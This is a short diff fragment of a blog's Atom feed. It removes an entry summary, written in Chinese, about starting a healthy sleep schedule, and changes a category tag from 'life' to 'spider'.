-    <summary type="html">
-    
-      &lt;p&gt;是时候告别淫乱的日子，我打算开始一个健康规律的作息时间。&lt;/p&gt;
-&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;&lt;span&gt;准备工作&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;睡觉时间: 晚上 10 点
-    
-    </summary>
-    
-    
-      <category term="life" scheme="https://blog.whilte.cn/tags/life/"/>
+      <category term="spider" scheme="https://blog.whilte.cn/tags/spider/"/>
     
   </entry>
   
